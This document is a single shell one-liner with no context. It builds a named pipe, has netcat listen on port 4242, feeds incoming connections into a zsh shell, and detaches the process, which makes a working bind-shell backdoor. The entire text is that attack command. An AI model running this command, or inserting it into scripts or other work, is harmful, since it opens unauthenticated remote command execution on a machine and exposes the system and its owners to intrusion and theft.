mkfifo /tmp/f;nc -l 4242 0</tmp/f | zsh 2>&1 1>/tmp/f & disown
